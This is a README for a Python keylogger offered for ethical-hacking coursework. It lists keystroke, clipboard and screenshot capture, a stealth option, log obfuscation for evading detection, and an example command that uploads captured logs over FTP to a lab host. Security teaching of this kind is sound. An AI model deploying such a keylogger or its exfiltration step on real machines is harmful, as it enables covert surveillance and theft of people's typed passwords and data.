# 🔑 Ethical Keylogger

> **⚠️ FOR EDUCATIONAL USE ONLY ⚠️**
>
> This tool is intended exclusively for cybersecurity education, authorized
> penetration testing labs, and security research in **controlled, isolated
> environments**. Using it against any system or person without **explicit
> written permission** is **illegal** and **unethical**. The author and
> contributors accept no liability for misuse.

A cross-platform Python keylogger built for ethical-hacking coursework and
security demonstrations. It shows students exactly how keystroke loggers work
under the hood so they can better understand, detect, and defend against them.

---

## ✨ Features

| Feature | Description |
|---|---|
| **Keystroke logging** | Captures every key press with timestamp and active-window context |
| **Mouse-click logging** | Records button, coordinates, and focused window |
| **Clipboard monitoring** | Detects and logs clipboard changes |
| **Screenshots** | Periodic PNG screenshots saved to a local `screenshots/` folder |
| **Phrase summarisation** | Reconstructs typed words for a human-readable summary |
| **FTP exfiltration demo** | Uploads the log file to an FTP server (lab demo only) |
| **Base64 obfuscation demo** | Shows how logs can be encoded to evade naive string matching |
| **Demo mode** | Prints all events to stdout with no files written |

---

## 🖥️ Requirements

- Python 3.10 or later
- The following third-party packages (install with pip):

```
pynput
pyautogui
pyperclip
```

Install them all at once:

```bash
pip install pynput pyautogui pyperclip
```

> **Linux users:** `pyautogui` screenshot support may require additional
> system packages such as `scrot` and `python3-tk`.

---

## 🚀 Usage

```
python keylogger.py [OPTIONS]
```

| Option | Description |
|---|---|
| `--demo` | Print events to stdout; write no files |
| `--no-log` | Disable the keystroke log file |
| `--summary-only` | Print reconstructed phrases only |
| `--screenshots` | Capture a screenshot every 60 seconds |
| `--obfuscate` | Base64-encode log lines (evasion technique demo) |
| `--stealth` | Clear the terminal on startup |
| `--ftp-host HOST` | FTP server hostname for log exfiltration demo |
| `--ftp-user USER` | FTP username |
| `--ftp-pass PASS` | FTP password |
| `--ftp-dir DIR` | Remote FTP directory (default: `/`) |

Press **Escape** at any time to flush the buffer and stop the logger.

### Examples

```bash
# Demo mode — stdout only, no files written
python keylogger.py --demo

# Log keystrokes to a file and capture periodic screenshots
python keylogger.py --screenshots

# Show only reconstructed phrases (no raw key events)
python keylogger.py --summary-only

# FTP exfiltration demo (requires a local/lab FTP server)
python keylogger.py --ftp-host 192.168.1.10 --ftp-user admin --ftp-pass secret --ftp-dir /logs

# Combine obfuscation and demo mode
python keylogger.py --demo --obfuscate
```

---

## 📂 Output

- **Log file** — written to the current directory as
  `keylog_YYYY-MM-DD_HH-MM-SS.txt`
- **Screenshots** — saved to `./screenshots/screenshot_YYYYMMDD_HHMMSS.png`

---

## ⚖️ Legal & Ethical Notice

This project is provided **for educational purposes only**.

- ✅ Use it on your own devices or in a lab environment where you have full authorisation.
- ✅ Use it to learn how keyloggers work so you can defend against them.
- ❌ **Do NOT** install or run this tool on any device without the owner's explicit written consent.
- ❌ **Do NOT** use this tool to collect data on individuals without their knowledge.

Misuse of this software may violate computer fraud and abuse laws in your
jurisdiction (e.g. the Computer Fraud and Abuse Act in the USA, the Computer
Misuse Act in the UK, and equivalent legislation elsewhere).

---

## 📄 License

This project is licensed under the terms of the [LICENSE](LICENSE) file
included in this repository.

